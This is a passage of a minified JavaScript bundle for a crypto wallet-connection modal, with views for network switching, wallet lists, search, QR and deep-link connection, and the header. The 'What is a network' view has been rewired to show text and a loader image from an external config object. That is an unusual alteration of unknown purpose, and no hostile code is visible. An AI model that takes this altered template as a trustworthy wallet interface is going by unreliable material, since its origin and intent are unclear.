          @click=${()=>{pt.openHref(`trust://open_url?coin_id=60&url=${document.URL}`,"_blank")}}
          ></wui-list-wallet>
        `
      }
      
      }};sE=pW([De("w3m-get-wallet-view")],sE);const gW=Qe`
  @keyframes shake {
    0% {
      transform: translateX(0);
    }
    25% {
      transform: translateX(3px);
    }
    50% {
      transform: translateX(-3px);
    }
    75% {
      transform: translateX(3px);
    }
    100% {
      transform: translateX(0);
    }
  }

  wui-flex:first-child:not(:only-child) {
    position: relative;
  }

  wui-loading-hexagon {
    position: absolute;
  }

  wui-icon-box {
    position: absolute;
    right: 4px;
    bottom: 0;
    opacity: 0;
    transform: scale(0.5);
    z-index: 1;
    transition: all var(--wui-ease-out-power-2) var(--wui-duration-lg);
  }

  wui-button {
    display: none;
  }

  [data-error='true'] wui-icon-box {
    opacity: 1;
    transform: scale(1);
  }

  [data-error='true'] > wui-flex:first-child {
    animation: shake 250ms cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
  }

  wui-button[data-retry='true'] {
    display: block;
    opacity: 1;
  }
`;var Sv=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Mf=class extends $e{constructor(){var e;super(),this.network=null==(e=Ft.state.data)?void 0:e.network,this.unsubscribe=[],this.showRetry=!1,this.error=!1,this.currentNetwork=Fr.state.caipNetwork,this.unsubscribe.push(Fr.subscribeKey("caipNetwork",(e=>{var t;(null==e?void 0:e.id)!==(null==(t=this.currentNetwork)?void 0:t.id)&&Ft.goBack()})))}disconnectedCallback(){this.unsubscribe.forEach((e=>e()))}firstUpdated(){this.onSwitchNetwork()}render(){if(!this.network)throw new Error("w3m-network-switch-view: No network provided");this.onShowRetry();const e=this.error?"Switch declined":"Approve in wallet",t=this.error?"Switch can be declined if chain is not supported by a wallet or previous request is still active":"Accept connection request in your wallet";return pe`
      <wui-flex
        data-error=${this.error}
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","3xl","xl"]}
        gap="xl"
      >
        <wui-flex justifyContent="center" alignItems="center">
          <wui-network-image
            size="lg"
            imageSrc=${qt(wn.getNetworkImage(this.network))}
          ></wui-network-image>

          ${this.error?null:pe`<wui-loading-hexagon></wui-loading-hexagon>`}

          <wui-icon-box
            backgroundColor="error-100"
            background="opaque"
            iconColor="error-100"
            icon="close"
            size="sm"
            ?border=${!0}
            borderColor="wui-color-bg-125"
          ></wui-icon-box>
        </wui-flex>

        <wui-flex flexDirection="column" alignItems="center" gap="xs">
          <wui-text align="center" variant="paragraph-500" color="fg-100">${e}</wui-text>
          <wui-text align="center" variant="small-500" color="fg-200">${t}</wui-text>
        </wui-flex>

        <wui-button
          data-retry=${this.showRetry}
          variant="fill"
          .disabled=${!this.error}
          @click=${this.onSwitchNetwork.bind(this)}
        >
          <wui-icon color="inherit" slot="iconLeft" name="refresh"></wui-icon>
          Try again
        </wui-button>
      </wui-flex>
    `}onShowRetry(){var e;this.error&&!this.showRetry&&(this.showRetry=!0,(null==(e=this.shadowRoot)?void 0:e.querySelector("wui-button")).animate([{opacity:0},{opacity:1}],{fill:"forwards",easing:"ease"}))}async onSwitchNetwork(){try{this.error=!1,this.network&&(await Fr.switchActiveNetwork(this.network),Ft.goBack())}catch{this.error=!0}}};Mf.styles=gW,Sv([xt()],Mf.prototype,"showRetry",void 0),Sv([xt()],Mf.prototype,"error",void 0),Sv([xt()],Mf.prototype,"currentNetwork",void 0),Mf=Sv([De("w3m-network-switch-view")],Mf);var g9=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let a2=class extends $e{constructor(){super(),this.unsubscribe=[],this.caipNetwork=Fr.state.caipNetwork,this.unsubscribe.push(Fr.subscribeKey("caipNetwork",(e=>this.caipNetwork=e)))}disconnectedCallback(){this.unsubscribe.forEach((e=>e()))}render(){return pe`
      <wui-grid padding="s" gridTemplateColumns="repeat(4, 1fr)" rowGap="l" columnGap="xs">
        ${this.networksTemplate()}
      </wui-grid>

      <wui-separator></wui-separator>

      <wui-flex padding="s" flexDirection="column" gap="m" alignItems="center">
        <wui-text variant="small-500" color="fg-300" align="center">
          Your connected wallet may not support some of the networks available for this dApp
        </wui-text>
        <wui-link @click=${this.onNetworkHelp.bind(this)}>
          <wui-icon size="xs" color="accent-100" slot="iconLeft" name="helpCircle"></wui-icon>
          What is a network
        </wui-link>
      </wui-flex>
    `}onNetworkHelp(){kr.sendEvent({type:"track",event:"CLICK_NETWORK_HELP"}),Ft.push("WhatIsANetwork")}networksTemplate(){const{approvedCaipNetworkIds:e,requestedCaipNetworks:t,supportsAllNetworks:r}=Fr.state,n=e,i=t;return null!=n&&n.length&&(null==i||i.sort(((e,t)=>n.indexOf(t.id)-n.indexOf(e.id)))),null==i?void 0:i.map((e=>{var t;return pe`
        <wui-card-select
          .selected=${(null==(t=this.caipNetwork)?void 0:t.id)===e.id}
          imageSrc=${qt(wn.getNetworkImage(e))}
          type="network"
          name=${e.name??e.id}
          @click=${()=>this.onSwitchNetwork(e)}
          .disabled=${!(r||null!=n&&n.includes(e.id))}
        ></wui-card-select>
      `}))}async onSwitchNetwork(e){const{isConnected:t}=Rr.state,{approvedCaipNetworkIds:r,supportsAllNetworks:n,caipNetwork:i}=Fr.state;t&&(null==i?void 0:i.id)!==e.id?null!=r&&r.includes(e.id)?await Fr.switchActiveNetwork(e):n&&Ft.push("SwitchNetwork",{network:e}):t||(Fr.setCaipNetwork(e),Ft.push("Connect"))}};g9([xt()],a2.prototype,"caipNetwork",void 0),a2=g9([De("w3m-networks-view")],a2);var vW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};const mW=[{images:[],title:cfg.middleHeaderText,text:cfg.text}];let oE=class extends $e{render(){return pe`
      <wui-flex
        flexDirection="column"
        .padding=${["xxl","xl","xl","xl"]}
        alignItems="center"
        gap="xl"
      >
        <img style="width:25%" src="${cfg.loaderImg}"></img>
        <div style="padding-bottom:15px;padding-top:10x;">
        <w3m-help-widget .data=${mW}></w3m-help-widget>
        </div>
      </wui-flex>
    `}};oE=vW([De("w3m-what-is-a-network-view")],oE);var bW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};const wW=[{images:["login","profile","lock"],title:"One login for all of web3",text:"Log in to any app by connecting your wallet. Say goodbye to countless passwords!"},{images:["defi","nft","eth"],title:"A home for your digital assets",text:"A wallet lets you store, send and receive digital assets like cryptocurrencies and NFTs."},{images:["browser","noun","dao"],title:"Your gateway to a new web",text:"With your wallet, you can explore and interact with DeFi, NFTs, DAOs, and much more."}];let aE=class extends $e{render(){return pe`
      <wui-flex
        flexDirection="column"
        .padding=${["xxl","xl","xl","xl"]}
        alignItems="center"
        gap="xl"
      >
        <w3m-help-widget .data=${wW}></w3m-help-widget>
        <wui-button variant="fill" size="sm" @click=${this.onGetWallet.bind(this)}>
          <wui-icon color="inherit" slot="iconLeft" name="wallet"></wui-icon>
          Get a Wallet
        </wui-button>
      </wui-flex>
    `}onGetWallet(){kr.sendEvent({type:"track",event:"CLICK_GET_WALLET"}),Ft.push("GetWallet")}};aE=bW([De("w3m-what-is-a-wallet-view")],aE);const yW=Qe`
  wui-grid {
    max-height: clamp(360px, 400px, 80vh);
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
    grid-template-columns: repeat(auto-fill, 76px);
  }

  @media (max-width: 435px) {
    wui-grid {
      grid-template-columns: repeat(auto-fill, 77px);
    }
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-loading-spinner {
    padding-top: var(--wui-spacing-l);
    padding-bottom: var(--wui-spacing-l);
    justify-content: center;
    grid-column: 1 / span 4;
  }
`;var R0=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};const cE="local-paginator";let Hl=class extends $e{constructor(){super(),this.unsubscribe=[],this.paginationObserver=void 0,this.initial=!rr.state.wallets.length,this.wallets=rr.state.wallets,this.recommended=rr.state.recommended,this.featured=rr.state.featured,this.unsubscribe.push(rr.subscribeKey("wallets",(e=>this.wallets=e)),rr.subscribeKey("recommended",(e=>this.recommended=e)),rr.subscribeKey("featured",(e=>this.featured=e)))}firstUpdated(){this.initialFetch(),this.createPaginationObserver()}disconnectedCallback(){var e;this.unsubscribe.forEach((e=>e())),null==(e=this.paginationObserver)||e.disconnect()}render(){return pe`
      <wui-grid
        data-scroll=${!this.initial}
        .padding=${["0","s","s","s"]}
        columnGap="xxs"
        rowGap="l"
        justifyContent="space-between"
      >
        ${this.initial?this.shimmerTemplate(16):this.walletsTemplate()}
        ${this.paginationLoaderTemplate()}
      </wui-grid>
    `}async initialFetch(){var e;const t=null==(e=this.shadowRoot)?void 0:e.querySelector("wui-grid");this.initial&&t&&(await rr.fetchWallets({page:1}),await t.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.initial=!1,t.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}shimmerTemplate(e,t){return[...Array(e)].map((()=>pe`
        <wui-card-select-loader type="wallet" id=${qt(t)}></wui-card-select-loader>
      `))}walletsTemplate(){return[...this.featured,...this.recommended,...this.wallets].map((e=>pe`
        <wui-card-select
          imageSrc=${qt(wn.getWalletImage(e))}
          type="wallet"
          name=${e.name}
          @click=${()=>this.onConnectWallet(e)}
        ></wui-card-select>
      `))}paginationLoaderTemplate(){const{wallets:e,recommended:t,featured:r,count:n}=rr.state,i=window.innerWidth<352?3:4,o=e.length+t.length;let s=Math.ceil(o/i)*i-o+i;return s-=e.length?r.length%i:0,0===n||[...r,...e,...t].length<n?this.shimmerTemplate(s,cE):null}createPaginationObserver(){var e;const t=null==(e=this.shadowRoot)?void 0:e.querySelector(`#${cE}`);t&&(this.paginationObserver=new IntersectionObserver((([e])=>{if(null!=e&&e.isIntersecting&&!this.initial){const{page:e,count:t,wallets:r}=rr.state;r.length<t&&rr.fetchWallets({page:e+1})}})),this.paginationObserver.observe(t))}onConnectWallet(e){const{connectors:t}=ks.state,r=t.find((({explorerId:t})=>t===e.id));r?Ft.push("ConnectingExternal",{connector:r}):Ft.push("ConnectingWalletConnect",{wallet:e})}};Hl.styles=yW,R0([xt()],Hl.prototype,"initial",void 0),R0([xt()],Hl.prototype,"wallets",void 0),R0([xt()],Hl.prototype,"recommended",void 0),R0([xt()],Hl.prototype,"featured",void 0),Hl=R0([De("w3m-all-wallets-list")],Hl);const _W=Qe`
  wui-grid,
  wui-loading-spinner,
  wui-flex {
    height: 360px;
  }

  wui-grid {
    overflow: scroll;
    scrollbar-width: none;
    grid-auto-rows: min-content;
  }

  wui-grid[data-scroll='false'] {
    overflow: hidden;
  }

  wui-grid::-webkit-scrollbar {
    display: none;
  }

  wui-loading-spinner {
    justify-content: center;
    align-items: center;
  }
`;var F3=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let s0=class extends $e{constructor(){super(...arguments),this.prevQuery="",this.loading=!0,this.query=""}render(){return this.onSearch(),this.loading?pe`<wui-loading-spinner color="accent-100"></wui-loading-spinner>`:this.walletsTemplate()}async onSearch(){this.query!==this.prevQuery&&(this.prevQuery=this.query,this.loading=!0,await rr.searchWallet({search:this.query}),this.loading=!1)}walletsTemplate(){const{search:e}=rr.state;return e.length?pe`
      <wui-grid
        .padding=${["0","s","s","s"]}
        gridTemplateColumns="repeat(4, 1fr)"
        rowGap="l"
        columnGap="xs"
      >
        ${e.map((e=>pe`
            <wui-card-select
              imageSrc=${qt(wn.getWalletImage(e))}
              type="wallet"
              name=${e.name}
              @click=${()=>this.onConnectWallet(e)}
            ></wui-card-select>
          `))}
      </wui-grid>
    `:pe`
        <wui-flex justifyContent="center" alignItems="center" gap="s" flexDirection="column">
          <wui-icon-box
            size="lg"
            iconcolor="fg-200"
            backgroundcolor="fg-300"
            icon="wallet"
            background="transparent"
          ></wui-icon-box>
          <wui-text color="fg-200" variant="paragraph-500">No Wallet found</wui-text>
        </wui-flex>
      `}onConnectWallet(e){const{connectors:t}=ks.state,r=t.find((({explorerId:t})=>t===e.id));r?Ft.push("ConnectingExternal",{connector:r}):Ft.push("ConnectingWalletConnect",{wallet:e})}};s0.styles=_W,F3([xt()],s0.prototype,"loading",void 0),F3([ve()],s0.prototype,"query",void 0),s0=F3([De("w3m-all-wallets-search")],s0);var Cv=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let o0=class extends $e{constructor(){super(),this.platformTabs=[],this.unsubscribe=[],this.platforms=[],this.onSelectPlatfrom=void 0,this.buffering=!1,this.unsubscribe.push(vr.subscribeKey("buffering",(e=>this.buffering=e)))}disconnectCallback(){this.unsubscribe.forEach((e=>e()))}render(){const e=this.generateTabs();return pe`
      <wui-flex justifyContent="center" .padding=${["l","0","0","0"]}>
        <wui-tabs
          ?disabled=${this.buffering}
          .tabs=${e}
          .onTabChange=${this.onTabChange.bind(this)}
        ></wui-tabs>
      </wui-flex>
    `}generateTabs(){const e=this.platforms.map((e=>"browser"===e?{label:"Browser",icon:"extension",platform:"browser"}:"mobile"===e?{label:"Mobile",icon:"mobile",platform:"mobile"}:"qrcode"===e?{label:"Mobile",icon:"mobile",platform:"qrcode"}:"web"===e?{label:"Webapp",icon:"browser",platform:"web"}:"desktop"===e?{label:"Desktop",icon:"desktop",platform:"desktop"}:{label:"Browser",icon:"extension",platform:"unsupported"}));return this.platformTabs=e.map((({platform:e})=>e)),e}onTabChange(e){var t;const r=this.platformTabs[e];r&&(null==(t=this.onSelectPlatfrom)||t.call(this,r))}};Cv([ve({type:Array})],o0.prototype,"platforms",void 0),Cv([ve()],o0.prototype,"onSelectPlatfrom",void 0),Cv([xt()],o0.prototype,"buffering",void 0),o0=Cv([De("w3m-connecting-header")],o0);var EW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let lE=class extends Vi{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-browser: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onAutoConnect=this.onConnectProxy.bind(this),kr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser"}})}async onConnectProxy(){try{this.error=!1;const{connectors:e}=ks.state,t=e.find((e=>{var t,r;return"ANNOUNCED"===e.type&&(null==(t=e.info)?void 0:t.rdns)===(null==(r=this.wallet)?void 0:r.rdns)})),r=e.find((e=>"INJECTED"===e.type));t?await vr.connectExternal(t):r&&await vr.connectExternal(r),On.close(),kr.sendEvent({type:"track",event:"CONNECT_SUCCESS",properties:{method:"browser"}})}catch(e){kr.sendEvent({type:"track",event:"CONNECT_ERROR",properties:{message:(null==e?void 0:e.message)??"Unknown"}}),this.error=!0}}};lE=EW([De("w3m-connecting-wc-browser")],lE);var xW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let uE=class extends Vi{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-desktop: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onRender=this.onRenderProxy.bind(this),kr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"desktop"}})}onRenderProxy(){!this.ready&&this.uri&&(this.ready=!0,this.timeout=setTimeout((()=>{var e;null==(e=this.onConnect)||e.call(this)}),200))}onConnectProxy(){var e;if(null!=(e=this.wallet)&&e.desktop_link&&this.uri)try{this.error=!1;const{desktop_link:e,name:t}=this.wallet,{redirect:r,href:n}=pt.formatNativeUrl(e,this.uri);vr.setWcLinking({name:t,href:n}),vr.setRecentWallet(this.wallet),pt.openHref(r,"_self")}catch{this.error=!0}}};uE=xW([De("w3m-connecting-wc-desktop")],uE);var SW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let fE=class extends Vi{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-mobile: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.onRender=this.onRenderProxy.bind(this),document.addEventListener("visibilitychange",this.onBuffering.bind(this)),kr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"mobile"}})}disconnectedCallback(){super.disconnectedCallback(),document.removeEventListener("visibilitychange",this.onBuffering.bind(this))}onRenderProxy(){var e;!this.ready&&this.uri&&(this.ready=!0,null==(e=this.onConnect)||e.call(this))}onConnectProxy(){var e;if(null!=(e=this.wallet)&&e.mobile_link&&this.uri)try{this.error=!1;const{mobile_link:e,name:t}=this.wallet,{redirect:r,href:n}=pt.formatNativeUrl(e,this.uri);vr.setWcLinking({name:t,href:n}),vr.setRecentWallet(this.wallet),pt.openHref(r,"_self")}catch{this.error=!0}}onBuffering(){const e=pt.isIos();"visible"===(null==document?void 0:document.visibilityState)&&!this.error&&e&&(vr.setBuffering(!0),setTimeout((()=>{vr.setBuffering(!1)}),5e3))}};fE=SW([De("w3m-connecting-wc-mobile")],fE);const CW=Qe`
  @keyframes fadein {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  wui-shimmer {
    width: 100%;
    aspect-ratio: 1 / 1;
    border-radius: clamp(0px, var(--wui-border-radius-l), 40px) !important;
  }

  wui-qr-code {
    opacity: 0;
    animation-duration: 200ms;
    animation-timing-function: ease;
    animation-name: fadein;
    animation-fill-mode: forwards;
  }
`;var AW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let c2=class extends Vi{constructor(){var e;super(),this.forceUpdate=()=>{this.requestUpdate()},window.addEventListener("resize",this.forceUpdate),kr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:(null==(e=this.wallet)?void 0:e.name)??"WalletConnect",platform:"qrcode"}})}disconnectedCallback(){super.disconnectedCallback(),window.removeEventListener("resize",this.forceUpdate)}render(){return this.onRenderProxy(),pe`
      <wui-flex padding="xl" flexDirection="column" gap="xl" alignItems="center">
        <wui-shimmer borderRadius="l" width="100%"> ${this.qrCodeTemplate()} </wui-shimmer>

        <wui-text variant="paragraph-500" color="fg-100">
          Scan this QR Code with your phone
        </wui-text>

        <wui-link @click=${this.onCopyUri} color="fg-200">
          <wui-icon size="sm" color="fg-200" slot="iconLeft" name="copy"></wui-icon>
          Copy Link
        </wui-link>
      </wui-flex>

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}onRenderProxy(){!this.ready&&this.uri&&(this.timeout=setTimeout((()=>{this.ready=!0}),200))}qrCodeTemplate(){if(!this.uri||!this.ready)return null;const e=this.getBoundingClientRect().width-40,t=this.wallet?this.wallet.name:void 0;return vr.setWcLinking(void 0),vr.setRecentWallet(this.wallet),pe`<wui-qr-code
      size=${e}
      theme=${Ts.state.themeMode}
      uri=${this.uri}
      imageSrc=${qt(wn.getWalletImage(this.wallet))}
      alt=${qt(t)}
    ></wui-qr-code>`}};c2.styles=CW,c2=AW([De("w3m-connecting-wc-qrcode")],c2);const IW=Qe`
  :host {
    display: flex;
    justify-content: center;
    gap: var(--wui-spacing-2xl);
  }

  wui-visual-thumbnail:nth-child(1) {
    z-index: 1;
  }
`;var RW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let l2=class extends $e{constructor(){var e;super(...arguments),this.dappImageUrl=null==(e=_r.state.metadata)?void 0:e.icons,this.walletImageUrl=Ms.getConnectedWalletImageUrl()}firstUpdated(){var e;const t=null==(e=this.shadowRoot)?void 0:e.querySelectorAll("wui-visual-thumbnail");null!=t&&t[0]&&this.createAnimation(t[0],"translate(18px)"),null!=t&&t[1]&&this.createAnimation(t[1],"translate(-18px)")}render(){var e;return pe`
      <wui-visual-thumbnail
        ?borderRadiusFull=${!0}
        .imageSrc=${null==(e=this.dappImageUrl)?void 0:e[0]}
      ></wui-visual-thumbnail>
      <wui-visual-thumbnail .imageSrc=${this.walletImageUrl}></wui-visual-thumbnail>
    `}createAnimation(e,t){e.animate([{transform:"translateX(0px)"},{transform:t}],{duration:1600,easing:"cubic-bezier(0.56, 0, 0.48, 1)",direction:"alternate",iterations:1/0})}};l2.styles=IW,l2=RW([De("w3m-connecting-siwe")],l2);var TW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let hE=class extends $e{constructor(){var e;if(super(),this.wallet=null==(e=Ft.state.data)?void 0:e.wallet,!this.wallet)throw new Error("w3m-connecting-wc-unsupported: No wallet provided");kr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"browser"}})}render(){return pe`
      <wui-flex
        flexDirection="column"
        alignItems="center"
        .padding=${["3xl","xl","xl","xl"]}
        gap="xl"
      >
        <wui-wallet-image
          size="lg"
          imageSrc=${qt(wn.getWalletImage(this.wallet))}
        ></wui-wallet-image>

        <wui-text variant="paragraph-500" color="fg-100">Not Detected</wui-text>
      </wui-flex>

      <w3m-mobile-download-links .wallet=${this.wallet}></w3m-mobile-download-links>
    `}};hE=TW([De("w3m-connecting-wc-unsupported")],hE);var NW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let dE=class extends Vi{constructor(){if(super(),!this.wallet)throw new Error("w3m-connecting-wc-web: No wallet provided");this.onConnect=this.onConnectProxy.bind(this),this.secondaryBtnLabel="Open",this.secondaryLabel="Open and continue in a new browser tab",this.secondaryBtnIcon="externalLink",kr.sendEvent({type:"track",event:"SELECT_WALLET",properties:{name:this.wallet.name,platform:"web"}})}onConnectProxy(){var e;if(null!=(e=this.wallet)&&e.webapp_link&&this.uri)try{this.error=!1;const{webapp_link:e,name:t}=this.wallet,{redirect:r,href:n}=pt.formatUniversalUrl(e,this.uri);vr.setWcLinking({name:t,href:n}),vr.setRecentWallet(this.wallet),pt.openHref(r,"_blank")}catch{this.error=!0}}};dE=NW([De("w3m-connecting-wc-web")],dE);const OW=Qe`
  wui-icon-link[data-hidden='true'] {
    opacity: 0 !important;
    pointer-events: none;
  }
`;var Av=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};function pE(){var e,t,r,n,i,o;const s=null==(t=null==(e=Ft.state.data)?void 0:e.connector)?void 0:t.name,a=(null==(n=null==(r=Ft.state.data)?void 0:r.wallet)?void 0:n.name)??s;return{Connect:"Connect Wallet",Account:void 0,ConnectingExternal:a??"Connect Wallet",ConnectingWalletConnect:a??"WalletConnect",ConnectingSiwe:"Sign In",Networks:"Choose Network",SwitchNetwork:(null==(o=null==(i=Ft.state.data)?void 0:i.network)?void 0:o.name)??"Switch Network",AllWallets:"All Wallets",WhatIsANetwork:cfg.headerText,WhatIsAWallet:"What is a wallet?",GetWallet:"Connect Wallet",Downloads:a?`Get ${a}`:"Downloads"}}let kf=class extends $e{constructor(){super(),this.unsubscribe=[],this.heading=pE()[Ft.state.view],this.buffering=!1,this.showBack=!1,this.unsubscribe.push(Ft.subscribeKey("view",(e=>{this.onViewChange(e),this.onHistoryChange()})),vr.subscribeKey("buffering",(e=>this.buffering=e)))}disconnectCallback(){this.unsubscribe.forEach((e=>e()))}render(){return pe`
      <wui-flex .padding=${this.getPadding()} justifyContent="space-between" alignItems="center">
        ${this.dynamicButtonTemplate()} ${this.titleTemplate()}
        <wui-icon-link
          ?disabled=${this.buffering}
          icon="close"
          @click=${On.close}
        ></wui-icon-link>
      </wui-flex>
      ${this.separatorTemplate()}
    `}onWalletHelp(){kr.sendEvent({type:"track",event:"CLICK_WALLET_HELP"}),Ft.push("WhatIsAWallet")}titleTemplate(){return pe`<wui-text variant="paragraph-700" color="fg-100">${this.heading}</wui-text>`}dynamicButtonTemplate(){const{view:e}=Ft.state,t="Connect"===e;return this.showBack?pe`<wui-icon-link
        id="dynamic"
        icon="chevronLeft"
        ?disabled=${this.buffering}
        @click=${Ft.goBack}
      ></wui-icon-link>`:pe`<wui-icon-link
      data-hidden=${!t}
      id="dynamic"
      icon="helpCircle"
      @click=${this.onWalletHelp.bind(this)}
